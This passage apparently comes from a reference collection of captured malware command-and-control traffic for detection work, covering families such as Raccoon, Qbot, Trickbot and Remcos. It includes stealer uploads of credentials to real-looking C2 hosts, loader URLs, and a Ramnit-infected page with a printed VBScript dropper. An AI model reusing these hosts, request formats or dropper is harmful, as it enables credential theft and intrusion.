abled: False=0D=0ATime Logs will be delivered: Every 60 minutes=0D=0A=
 =0D=0AStealers Enabled: True=0D=0ATime Log will be delivered: Av=
erage 2 to 4 minutes=0D=0A =0D=0ALocal Date and Time: 10/17/2019 =
8:04:41 AM=0D=0AInstalled Language: en-US=0D=0AOperating System: =
Microsoft Windows 7 Professional =0D=0AInternal IP Address: 192.1=
68.180.170=0D=0AExternal IP Address: =0D=0AInstalled Anti-Virus: =
=0D=0AInstalled Firewall:=20

.
250 OK id=1iL7Kv-003iIX-Hl

From: pain@globalfinancel.com
To: pain@globalfinancel.com
Date: 17 Oct 2019 08:05:04 -0700
Subject: Predator Pain v13|Stealer Log - [XRWJAM272278424]
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: quoted-printable

                                 ********************************=
**************=0D=0A                                      Operati=
ng System Intel Recovery=0D=0A                                 **=
********************************************=0D=0ACPU Name: XRWJA=
M272278424=0D=0ALocal Date and Time: 10/17/2019 8:04:55 AM=0D=0AI=
nstalled Language: en-US=0D=0ANet Version: 4.0.30319.42000=0D=0AO=
perating System Platform: Win32NT=0D=0AOperating System Version: =
6.1.7601.65536=0D=0AOperating System: Microsoft Windows 7 Profess=
ional =0D=0AInternal IP Address: 192.168.180.170=0D=0AExternal IP=
 Address: =0D=0AInstalled Anti-Virus: =0D=0AInstalled Firewall: =0D=0A=
                                 ********************************=
**************=0D=0A                                      WEB Bro=
wser Password Recovery=0D=0A                                 ****=
******************************************=0D=0A=0D=0A           =
                      *******************************************=
***=0D=0A                                    Mail Messenger Passw=
ord Recovery=0D=0A                                 **************=
********************************=0D=0A=0D=0A                     =
            **********************************************=0D=0A =
                                   Internet Download Manager Reco=
very=0D=0A                                 **********************=
************************=0D=0A                                 **=
********************************************=0D=0A               =
                       Jdownloader Password Recovery=0D=0A       =
                          ***************************************=
*******

.
250 OK id=1iL7LE-003ina-5V
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/predatorpain.png "Predator Pain Keylogger")

#### Predator the Thief
~~~
POST /api/check.get HTTP/1.1
Content-Type: text/html
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.906.121 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Host: 95.215.205.56
Content-Length: 0
Connection: Keep-Alive
Cache-Control: no-cache

HTTP/1.1 200 OK
Date: Wed, 09 Oct 2019 20:05:42 GMT
Server: Apache
Set-Cookie: SID_INTERFICE=4c616d7fffe95fe8fc2f4f46d272c8a0412c1404; expires=Thu, 10-Oct-2019 20:05:42 GMT; Max-Age=86400; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Content-Length: 132
Keep-Alive: timeout=10, max=100
Connection: Keep-Alive
Content-Type: text/plain; charset=utf-8

nr8uEQylGUpuY0Qjyde/Fn3TGzRg6JFXvSXGhXxBL0Ls2eMYLaWSpJIvp6bRuCqmkclDgfyfYtc7/hQGxqKlJiPdCQ0v/JyN12lNiho7IjBLW3VB02orxGMXTr04WaAQz73q

HTTP/1.1 200 OK
Date: Wed, 09 Oct 2019 20:05:42 GMT
Server: Apache
Set-Cookie: SID_INTERFICE=4c616d7fffe95fe8fc2f4f46d272c8a0412c1404; expires=Thu, 10-Oct-2019 20:05:42 GMT; Max-Age=86400; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Content-Length: 132
Keep-Alive: timeout=10, max=100
Connection: Keep-Alive
Content-Type: text/plain; charset=utf-8

nr8uEQylGUpuY0Qjyde/Fn3TGzRg6JFXvSXGhXxBL0Ls2eMYLaWSpJIvp6bRuCqmkclDgfyfYtc7/hQGxqKlJiPdCQ0v/JyN12lNiho7IjBLW3VB02orxGMXTr04WaAQz73qPOST /api/gate.get?p1=2&p2=5&p3=0&p4=2&p5=0&p6=0&p7=0&p8=0&p9=0&p10=udh8T1P6VQh1ZF9DgIniQjWRSWBTqqYq5k2u HTTP/1.1
Content-Type: multipart/form-data; boundary=---------------------------228
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.906.121 Safari/537.36
Host: 95.215.205.56
Content-Length: 6028
Connection: Keep-Alive
Cache-Control: no-cache
Cookie: SID_INTERFICE=4c616d7fffe95fe8fc2f4f46d272c8a0412c1404

-----------------------------228
Content-Disposition: form-data; name="file"; filename="s7q3q0u1v7q3q0u1v7.zip"
Content-Type: application/octet-stream

PK..........IO................Outlook/UT
...K.].K.].K.]PK..........IOo...?...F.......Outlook/Outlook.txtUT
...K.].K.].K.]s.M...R...K.t(./.K..e..
H,.../J.......f@.`...+.CK#=C3.=C=C../..PK..........IO................General/UT
...K.].K.].K.]PK..........IO................Cookies/UT
...K.].K.].K.]PK..........IO................History/UT
...K.].K.].K.]PK..........IO................Other/UT
...K.].K.].K.]PK..........IOa.qZ............History/Chrome_0.txtUT
...K.].K.].K.].V[k.8.~..?.............B...>..,{D4.V....?..e..4M.M...`....s...O....3..b%....0.
7.'_.;s6.H}6.kZ.Fz........i...aZ...".".v.P.x>PR.[.D...$Q..."...%
f...Y.[.V.......G.*"...Ig..Y...k=}..}..U....@....T..n.-)7Z.Yt..%...$.P.vQ....p.z..&..t...P[...w...T....6A..!k...:...V...Fp.....-.a.....7......_.X...E../;..T8..7.I..)Y..(..,....)JP..........nf..g..E.\..(..@..XQ.l....".e..a.X .H.?*.".a.F9`..~zrzr..	.M......
.
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/predator.png "Predator")

#### Proyecto (aka Nemours) RAT
~~~
0|New - 25-10-19/21:41|United States|USER-PC - admin|Windows 7 Professional - 32 Bits / Intel(R) Core(TM) i5-6400 CPU @ 2.70GHz / 4 /  / 0|US|0|192.168.100.60|0 Cap.|oolkth|9090|OFF| - 0 / || Tiene Capturas de: |New - |||No Available
13|Program Manager|OFF|OFF - 0 / ||
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/proyecto.png "Proyecto")

#### Pyrogenic
flah on "53 E1 6D D3 9E EE 45 D4" on iniial connection, 175 bytes
~~~
00000000  53                                                 S
00000001  e1 6d d3 9e ee 45 d4 ad  26 96 67 86 36 fb f7 cc   .m...E.. &.g.6...
00000011  3f 15 13 b7 cf 5e 99 ac  dc 9d e6 36 cd 61 bd 91   ?....^.. ...6.a..
00000021  37 5c db a0 15 ec f4 5a  9a 63 96 7f 2b e6 b3 3c   7\.....Z .c..+..<
00000031  96 a9 aa fe d6 37 6d f5  1d 57 8f 26 f1 03 a4 7a   .....7m. .W.&...z
00000041  7b d9 5f 01 8c 5e 87 c5  de 80 a2 52 15 24 e0 73   {._..^.. ...R.$.s
00000051  51 70 b4 6f 60 7c a8 4c  df 36 ac df 96 b3 18 b5   Qp.o`|.L .6......
00000061  54 37 74 9b d1 60 06 f1  46 b2 8f e2 23 f2 58 80   T7t..`.. F...#.X.
00000071  de d9 8d d9 10 35 91 7f  d9 74 4b 6e 05 4c 13 9f   .....5.. .tKn.L..
00000081  68 85 65 d0 bb f6 67 0c  78 ae 12 b6 ab 89 90 14   h.e...g. x.......
00000091  e0 47 c5 56 c9 e0 0f 17  73 95 ee 30 08 fa 0e 47   .G.V.... s..0...G
000000A1  cd ec dd 72 db e7 ff bf  b9 57 b3 61 c4 cb 4c      ...r.... .W.a..L
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/pyrogenic.png "Pyrogenic")

#### Qbot
usually url is /t3
~~~
POST /t3 HTTP/1.1
Accept: application/x-shockwave-flash, image/gif, image/jpeg, image/pjpeg, */*
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko
Host: 174.48.72.160
Content-Length: 215
Cache-Control: no-cache

ycgizbarun=8e5ygoO+WS2h/ypd2ZEi8nHeEKPFyrdKrXgLyQd6Gi76j4KxXuMEm2K/lEHrTJqqWdDWXZQWcLyTbSnECgNFerjMjb9ittXV+rg/yqpLMLtOWYw6pCz2nDkPbGnUW3Z61/yZoSoh9zdJzkpTmYMCloxmblZ9Eos4QZHsiMecjlcmNjwU1D/9ShQ6cGKSJxHNVT2lNGCykNU=

HTTP/1.1 200 OK
Server: nginx/1.9.12
Content-Length: 41

ParseHttpResponse() failed pCurlResp=NULL
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/qbot.png "Qbot Qakbot")

#### Quasar RAT
Flag on "40 00 00 00" pattern, 68 data bytes on first packet
~~~
00000000  40 00 00 00 3e 83 58 08 ad d1 05 8d 77 20 53 1f   @...>.X. ....w S.
00000010  dc 2e e8 99 0a f3 f1 bb 3a 8c c2 a1 9d 72 4a 69   ........ :....rJi
00000020  e6 60 97 da 1e 76 87 16 91 f2 1b c4 f4 89 f9 8a   .`...v.. ........
00000030  20 5b 19 e5 7c ae ed f1 b4 5a d2 ce 5f 86 17 20    [..|... .Z.._.. 
00000040  c6 b3 03 8c                                        ....
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/quasar.png "Quasar")

#### RaaLoader aka Pefsire
~~~
00000000  12 10 00 00 00 00 00 00  00 00 00 00               ........ ....
    00000000  00 00 00 00 06                                     .....
0000000C  00 00 00 00 06                                     .....
    00000005  00 00 00 00 06                                     .....
00000011  00 00 00 00 06                                     .....
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/raaloader.png "RaaLoader")

#### Raccoon Stealer
~~~
POST /gate/log.php HTTP/1.1
Cache-Control: no-cache
Connection: Keep-Alive
Pragma: no-cache
Content-Type: application/x-www-form-urlencoded
Content-Length: 155
Host: 35.189.105.242

params=Ym90X2lkPTkwMDU5QzM3LTEzMjAtNDFBNC1CNThELTJCNzVBOTg1MEQyRl9hZG1pbiZjb25maWdfaWQ9NGVkZTQxZmUwZWE5NjMwMzRhM2Q2NWYwZGQ0NDJkZTQ2NzFjMjE0ZiZkYXRhPW51bGw=HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Mon, 30 Sep 2019 19:36:57 GMT
Content-Type: application/json
Transfer-Encoding: chunked
Connection: keep-alive
Access-Control-Allow-Origin: *

{"url":"http://35.189.105.242/file_handler/file.php?hash=559f10a49e5f74c12b67d2b61c0dea701f752e43&js=cbe0dbfb63ca8503c1938fc9cdd5f5f3818d81b9&callback=http://35.189.105.242/gate","attachment_url":"http://35.189.105.242/gate/sqlite3.dll","libraries":"http://35.189.105.242/gate/libs.zip","ip":"89.187.165.57","config":{"masks":null,"loader_urls":["https://mygift.space/download/beam.exe"]},"is_screen_enabled":0,"is_history_enabled":0}HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Mon, 30 Sep 2019 19:36:57 GMT
Content-Type: application/json
Transfer-Encoding: chunked
Connection: keep-alive
Access-Control-Allow-Origin: *

{"url":"http://35.189.105.242/file_handler/file.php?hash=559f10a49e5f74c12b67d2b61c0dea701f752e43&js=cbe0dbfb63ca8503c1938fc9cdd5f5f3818d81b9&callback=http://35.189.105.242/gate","attachment_url":"http://35.189.105.242/gate/sqlite3.dll","libraries":"http://35.189.105.242/gate/libs.zip","ip":"89.187.165.57","config":{"masks":null,"loader_urls":["https://mygift.space/download/beam.exe"]},"is_screen_enabled":0,"is_history_enabled":0}POST /file_handler/file.php?hash=559f10a49e5f74c12b67d2b61c0dea701f752e43&js=cbe0dbfb63ca8503c1938fc9cdd5f5f3818d81b9&callback=http://35.189.105.242/gate HTTP/1.1
Cache-Control: no-cache
Connection: Keep-Alive
Pragma: no-cache
Content-Type: multipart/form-data, boundary=Jfbvjwj3489078yuyetu
Content-Length: 2152
Host: 35.189.105.242

._=
--Jfbvjwj3489078yuyetu
content-disposition: form-data; name="file"; filename="data.zip"
Content-Type: application/octet-stream

PK..........>O..5kf.......
...passwords.txtUT
..`Y.]ZY.]ZY.]..w..Rp..O.IUp.(..M......
f....[.....%&.&..g.%....r........R+.
.K@..\....P....bcS3^.^.`..n.E.n..0.I2..PK..........>O"..:............browsers/firefox_cookie.txtUT
..`Y.]`Y.]`Y.]..KK.@...S.O.8..+.. .+..kJ6a..!.	mb...T.qQ......
.@...:.,m..y....
a...RK.
.......]w.\.U.k...L<..........s.m...|..9=.].l..0...7W...zY..mi....e...........di"..|M.t2...T..E...6.RI...dB.-s..c<.c.......;.r..E....tr.[..
......g@..X....^.Dl.`W.?.YQ.o...F...$\..K..v..+..." 0.|.PK..........>O................browsers/firefox_urls.txtUT
..`Y.]`Y.]`Y.]..K..0...=	w....>hI....4..(h.lI[.zz....v7.........s.......}.MS...@kd_.n........Vw.e.
........H1%.@.8._..A.+\.U._.O.....,C1..q..tj.......'......`..c_.+.Z.N...(2,....|..	8.vd.f.p.1.,y..PK..........>O.JJ.:...Z.......browsers/chrome_autofill.txtUT
..ZY.]ZY.]ZY.]s./.U.K.M.Rp.,*...2y..@.e.9.@a.......^..0D.O"6.A.)E.... ..PK..........>O..GMN...|.......mails/outlook.txtUT
..eY.]eY.]eY.]..
	P.N-*K-.2.4.34..3.3..
..0.*.....c....Z.P._.....U.Z.T.M" ...<.(."Y......r..PK..........>O..DH....o.......System Info.txtUT
..eY.]eY.]eY.]mR]k.0.}^ ..>&.6.l..`0'Y..f.$...(.....d$;k..'ws)ez.:..su?~.D][k.....~A.W.3...F....Qx..d.+-...Vi..bn...?.K..<e.2`......M........2NH0.%OrNJ..N..v..5....\%yD.F..Vi...u..yV.EF...^..2..t......'..........5|.!..G.
s.C9.>..V...;...K ^..x..P.1-....8.G..2...pE..<........Y.........?..".~.5....c.F|........0..u8;....h..2..	X....g..a"..|.>T;.IV$.[.,[...{...c..
. ...f.e.y...%k.[-.@.U..C7?.yX.a.p..o*.8.6..PI.v..7.......Tm.y..?PK............>O..5kf.......
.	....... .......passwords.txtUT...`Y.]PK............>O"..:..........	....... .......browsers/firefox_cookie.txtUT...`Y.]PK............>O..............	....... .......browsers/firefox_urls.txtUT...`Y.]PK............>O.JJ.:...Z.....	....... .......browsers/chrome_autofill.txtUT...ZY.]PK............>O..GMN...|.....	....... ...~...mails/outlook.txtUT...eY.]PK............>O..DH....o.....	....... .......System Info.txtUT...eY.]PK....................
--Jfbvjwj3489078yuyetu--HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Mon, 30 Sep 2019 19:37:10 GMT
Content-Type: application/json
Transfer-Encoding: chunked
Connection: keep-alive
Access-Control-Allow-Origin: *

true"success"
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/raccoon-1.png "Predator")
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/raccoon-2.png "Predator")

#### Remcos RAT
~~~
[DataStart]x...K...SMILING BASES|cmd|M.K.Z.T.2.4.4.6.8.5.8.7.4.7.4./.h.g.M.y.Z.r.4.1.u.S.U.1.F.|cmd|US|cmd|Microsoft Windows XP (32 bit)|cmd||cmd|2095747072|cmd|2.5.0 Pro|cmd|C.:.\.D.o.c.u.m.e.n.t.s. .a.n.d. .S.e.t.t.i.n.g.s.\.A.d.m.i.n.i.s.t.r.a.t.o.r.\.A.p.p.l.i.c.a.t.i.o.n. .D.a.t.a.\.y.e.d.c.o.s.\.l.o.g.s...d.a.t.|cmd|C.:.\.D.O.C.U.M.E.~.1.\.A.D.M.I.N.I.~.1.\.L.O.C.A.L.S.~.1.\.T.e.m.p.\.R.e.g.S.v.c.s...e.x.e.|cmd||cmd||cmd|1|cmd|0|cmd|9562396|cmd|1|cmd|hangulcoxpw.pw|cmd|uCjp95GKXiHwd-AJJHX8|cmd|0|cmd|C.:.\.D.O.C.U.M.E.~.1.\.A.D.M.I.N.I.~.1.\.L.O.C.A.L.S.~.1.\.T.e.m.p.\.R.e.g.S.v.c.s...e.x.e.|cmd|Intel(R) Core(TM) i7-4770 CPU @ 3.40GHz
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/remcos.png "Remcos")

#### Ramnit
~~~
GET / HTTP/1.1
Host: www.yx-lj.com
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

HTTP/1.1 200 OK
Content-Length: 114482
Content-Type: text/html
Content-Location: http://www.yx-lj.com/index.htm
Last-Modified: Tue, 21 May 2019 01:43:35 GMT
Accept-Ranges: bytes
ETag: "47c7bf9a76fd51:ac9"
Server: Microsoft-IIS/6.0
MicrosoftOfficeWebServer: 5.0_Pub
X-Powered-By: ASP.NET
Date: Thu, 17 Oct 2019 18:56:31 GMT

<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<title>..........</title>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
<meta name="Keywords" content="........,................,........" />
<meta name="Description" content="...................................................." />
<link href="images/style.css" rel="stylesheet" type="text/css">
<style type="text/css">
<!--
body {
	margin-left: 0px;
	margin-top: 0px;
	margin-right: 0px;
	margin-bottom: 0px;
	background-color: #000000;
}
-->
</style>
</head>

<body>



<title>..........</title>
<table width="100%" height="100%" border="0" cellpadding="0" cellspacing="0">
  <tr>
    <td align="center" valign="middle" bgcolor="#000000"><object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=7,0,19,0" width="990" height="677">
      <param name="movie" value="china/images/index.swf" />
      <param name="quality" value="high" />
      <param name="BGCOLOR" value="#000000" />
      <embed src="china/images/index.swf" width="990" height="677" quality="high" pluginspage="http://www.macromedia.com/go/getflashplayer" type="application/x-shockwave-flash" bgcolor="#000000"></embed>
    </object></td>
  </tr>
</table>
</body>
</html>
 

 
 
<SCRIPT Language=VBScript><!--
DropFileName = "svchost.exe"
WriteData = "4D5A90000300000004000000FFFF0000B80000000000000040000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/ramnit.png "Ramnit")

#### Revenge RAT
~~~
InformationRevenge-RATUEVSRElSRevenge-RATX0M0QkEzNjQ3Revenge-RAT192.168.100.213Revenge-RATVVNFUi1QQyAvIGFkbWluRevenge-RATNoRevenge-RATTWljcm9zb2Z0IFdpbmRvd3MgNyBQcm9mZXNzaW9uYWwgIDMyRevenge-RATSW50ZWwoUikgQ29yZShUTSkgaTUtNjQwMCBDUFUgQCAyLjcwR0h6Revenge-RAT3757686784Revenge-RATTi9BRevenge-RATTi9BRevenge-RAT1000Revenge-RATTWljcm9zb2Z0IFBvd2VyUG9pbnQ=Revenge-RATZW4tVVM=Revenge-RATFalse*-]NK[-*
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/revenge.png "Revenge RAT")

#### RMS RAT
~~~
...........<?xml version="1.0" encoding="UTF-8"?>
<rman_message version="67002"><code>1</code><string_param></string_param><string_param_2></string_param_2><int_param>1</int_param><data>77u/PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4NCjxyb21fdmVyc2lvbiB2ZXJzaW9uPSI2NzAwMiI+PHByb2R1Y3Q+Uk1TPC9wcm9kdWN0Pjx2ZXJzaW9uPjY3MDAyPC92ZXJzaW9uPjx0ZXh0X3ZlcnNpb24+Ni43LjAuMjwvdGV4dF92ZXJzaW9uPjxiZXRhX3ZlcnNpb24+MDwvYmV0YV92ZXJzaW9uPjxwcm90b2NvbF92ZXJzaW9uPjU8L3Byb3RvY29sX3ZlcnNpb24+PGtpbmQ+MTwva2luZD48aWQ+NDAwLTYyMi05OTItNzg5PC9pZD48ZGV2aWNlX25hbWU+VXNlci1QQzwvZGV2aWNlX25hbWU+PGNvdW50cnlfY29kZT4yNDQ8L2NvdW50cnlfY29kZT48dXNlcl9kYXRhPjNGNEY1QTZDQjk1MDQ3RkVBNjEwMkJEN0QyMjI2QUE5PC91c2VyX2RhdGE+PHN5c3RlbV9oYXNoPjA4Q0FDN0UyNTQ0MTMzRjNBODIzMEZENUY5MzM0QkMzMUFEQTY5NkVFNUYzMzczQjVEODUzMzZCNTcxRDRFRkQ5MEVGQjU5NzJFRUNFMzg3N0M3QUNENDUyODBGRUJCQTJCMjMzMDZCOENDRkYwRDhDNUUyOTJCQ0M3OEY2MjAzPC9zeXN0ZW1faGFzaD48c3luY19kYXRhPkM4Q0VBOEJBRDQxODFBMjFBNDU4QzVGNkU1MTIwN0Y0PC9zeW5jX2RhdGE+PHJhdGlvPjA8L3JhdGlvPjx0cmlhbF9zdGF0ZT4wPC90cmlhbF9zdGF0ZT48YnBoX3ZlcnNpb24+ZmFsc2U8L2JwaF92ZXJzaW9uPjxsaWNlbnNlX2tleT48L2xpY2Vuc2Vfa2V5PjxkYXlzX2xlZnQ+MDwvZGF5c19sZWZ0Pjwvcm9tX3ZlcnNpb24+DQo=</data></rman_message>
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/rms.png "RMS RAT")

#### Sarwent BOT"
~~~
GET /gate/connect?os=Windows+7+Release+Preview+(Build%3A+7601+-+Service+Pack%3A+1.0)+&bits=x64&av=Not+found HTTP/1.1
Host: shopstoregame.icu
Connection: keep-alive
User-Agent: Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14
Accept: */*

HTTP/1.1 200 OK
Date: Mon, 14 Oct 2019 11:02:40 GMT
Server: Apache/2.4.18 (Ubuntu)
Cache-Control: no-cache, private
Set-Cookie: XSRF-TOKEN=eyJpdiI6IjNkQ2hqY01YSVJtRUlBM1REeCtxRkE9PSIsInZhbHVlIjoiV1Y2dkxHMjRYWm5TemxGOFNUWHlKU0hZTWNJKyszaVh3SVEzb3pWcEFBeUhFOU9UQms3a3ZKMUo3U1NLNzE0dCIsIm1hYyI6IjZlMWEwMTM2YjE0NDcxMzJkYjY1MmE2NmQxZjU0YzJjYjAwODU0MWI0YTRhMTUyNzQxOTg2MjYwNjQyMjAyOWIifQ%3D%3D; expires=Mon, 14-Oct-2019 13:02:40 GMT; Max-Age=7200; path=/
Set-Cookie: laravel_session=eyJpdiI6Ijd5dUpwTE5yMmFWeUFPVmZTUlA3bnc9PSIsInZhbHVlIjoiTlpNajV5eDVFWlVzUDdjMFwvdFlTYm41UVNFVW5JdVJuZzdvN0ZFcWNaWFRlOXcwUWRVSUdwQm0wK1VFSmRBQkoiLCJtYWMiOiJlNjg1OGMzNWQ5ZDI2NjU2ZmU0MzBiNjNkN2Y3MDAwZDhhZThkMTllNWQ2MTRlYWM5YzI3MGI0MzllYzg2MDI4In0%3D; expires=Mon, 14-Oct-2019 13:02:40 GMT; Max-Age=7200; path=/; httponly
Content-Length: 0
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/sarwent.png "Sarwent BOT")

#### Servhelper
~~~
POST /like/s.php HTTP/1.1
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded; charset=utf-8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0
Content-Length: 376
Host: laph.icu

key=%00%00%04%03%1B%00%1B&sysid=%06%1A%18%5EX%2B%3B%06%1A%08%00%03%1FOCL%3C%11%1E%19%1D%0F%0AT%3C%0E%17%07OELG%22%09%1D%07%05%00%1ALYZ%5DCT.%1A%1D%00%0BT%5BYD%5DCTZ%5BY%0E%06%00L*%10%05%1B%1D%03%01%5D3%17BX0%01%1F%0A%06%02%0E%19%09UT9%3C1%3EB%24%2FK%2B%1B%06%1A%0D%0C%17V%18%13%0D%1A%00%05%03%15%0F%0CO%21%3AB%5B%05%1A%27%3AO3Z%40TY%40&resp=%03%04&rights=%0A%09%12%0A%09&misc=
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/servhelper.png "ServHelper")

#### Smokeloader
~~~
POST / HTTP/1.1
Cache-Control: no-cache
Connection: Keep-Alive
Pragma: no-cache
Content-Type: application/x-www-form-urlencoded
Accept: */*
Referer: http://thankg1.org/
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko
Content-Length: 299
Host: thankg1.org

..ngl$j.N...$.=\..98h...8..XO.(3ET]...p1.Z.Q.....GI.1R..j6......NF`&....."5..V.~...#.,w......\N.V`.gI..0&.
.N.Z...%.b.....V..3H....t..6w.....7.0..
..+.........O..`...4..A..wT.F...XM&2.^.Y................E.4	W`.......(.....<,.zK..>c..^...p......n.z"]....\S,[.
......qV4`..Pu*...8W.........M .h.v.S.:.
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/smokeloader.png "Smokeloader")

#### Trickbot
~~~
GET https://190.154.203.218:449/trg448/JONATHAN-PC_W617601.F330EDDF8E877AF892B08D9522EAD4C6/5/spk/
      << 200 OK 224b
GET http://54.225.92.64/
      << 200 OK 12b
GET https://190.154.203.218:449/trg448/JONATHAN-PC_W617601.F330EDDF8E877AF892B08D9522EAD4C6/0/Windows%207%20x64%20SP1/1075/167.88.7.134/77CAB0693C33C9DA65ECB06B990E1B2A0B60E199332E20B769B1041E6155930A/7FPzmRZqhwAAJvgTcFSqNLk/
      << 200 OK 937b
GET https://190.154.203.218:449/trg448/JONATHAN-PC_W617601.F330EDDF8E877AF892B08D9522EAD4C6/14/user/SYSTEM/0/
      << 200 OK
GET https://190.154.203.218:449/trg448/JONATHAN-PC_W617601.F330EDDF8E877AF892B08D9522EAD4C6/14/path/C:%5CUsers%5CJonathan%5CAppData%5CRoaming%5CnetRest%5C%E4%BB%BB%E3%81%AF%E3%82%A7%E7%A7%81%E3%81%8D%E7%A7%81%E6%8A%B1%E3%81%9F%E3%82%82%E3%81%A1%E6%84%9B.exe/0/
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/trickbot.png "Trickbot")

#### Ursa Loader
~~~
POST /nj41.php HTTP/1.1
Accept: */*
Accept-Language: en-us
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3)
Host: 18.217.112.176
Content-Length: 3
Connection: Keep-Alive
Cache-Control: no-cache

q=1HTTP/1.1 200 OK
Date: Fri, 19 Jul 2019 15:17:26 GMT
Server: Apache/2.4.18 (Ubuntu)
Vary: Accept-Encoding
Content-Encoding: gzip
Content-Length: 5840
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

FHTHSEPHJHWHWHTHWEPHWHJHXIAHRHJEPHSHJIDHYDVDSDVDSDVDSDVDSHHHTHSHXHYEPEPHHGAGMGBEPEPEPFTEPFNFODVDSHHHTHSHXHYEPEPHHGGGBEPEPFTEPERFHERDVDSHHHTHSHXHYEPEPHXGPHTHQHJGVEPEPFTEPERHMHYHYHUFQFFFFFHFOFEFIFHFNFEFHFHFIFEFHFNFMFFHPHXFJHFERDVDSHHHTHSHXHYEPEPHXGPHTHQHJGVGUFIEPEPFTEPERHMHYHYHUFQFFFFFHFOFEFIFHFNFEFHFHFIFEFHFNFMFFHRFFHPHXFJERDVDSHHHTHSHXHYEPEPICHQHNHSHPGDEPEPFTEPERHMHYHYHUFQFFFFFHFOFEFIFHFNFEFHFHFIFEFHFNFMFFERDVDSHHHTHSHXHYEPEPHHGPHFHNIFFHEPFTEPERGAFQHAGSHXHJHWHXHAGNIAHGHQHNHHHAERDVDSHHHTHSHXHYEPEPHHGVGFEPFTEPERFEHSHOFKERDVDSHHHTHSHXHYEPEPHHGVGXEPFTEPERFEIFHNHUERDVDSHHHTHSHXHYEPEPHHGUIAHXFJHWEPFTEPERHPHXFJERDVDSHHHTHSHXHYEPEPHHGQHJHSGJHTHFHIEPFTEPERHUHYHTHRIDERDVDSHHHTHSHXHYEPEPHHGAHMHNHQHJHGHJHFHSHXEPFTEPERFHERDVDSHHHTHSHXHYEPEPICGTHJHWHXHNHTHSEPFTEPERFHERDVDSHHHTHSHXHYEPEPICGTHJHWHXHNHTHSFXHUHUEPFTEPERFHERDVDSHHHTHSHXHYEPEPICGTHJHWHXHNHTHSFX
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/ursa.png "Ursa Loader")

#### Ursnif:
~~~
POST /images/wsF0B4sp/ZaYjjdVgt73Q1BSOy_2Fofi/qF_2BfPTuK/5Ha_2F0xEvmbSfT_2/FluJ8ZF_2Fx8/g6xkZAZrZwN/2skHgzv92i_2BS/uPf4RDQvATKCgx0GZ5gez/ph_2BLcscLQkKDVw/HGZ6zA6DhGCqgPD/VTX09Q_2FUWIFyWps1/nfJ0I3rIZ/QNKbXjeu7xXa3W_2FZSX/bcWtE2zC4RafXFoRlqL/4EC4YHwclzkXrfX/58a3.bmp HTTP/1.1
Cache-Control: no-cache
Connection: Keep-Alive
Pragma: no-cache
Content-Type: multipart/form-data; boundary=36775038942641984568
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Content-Length: 399
Host: shoshanna.at

--36775038942641984568
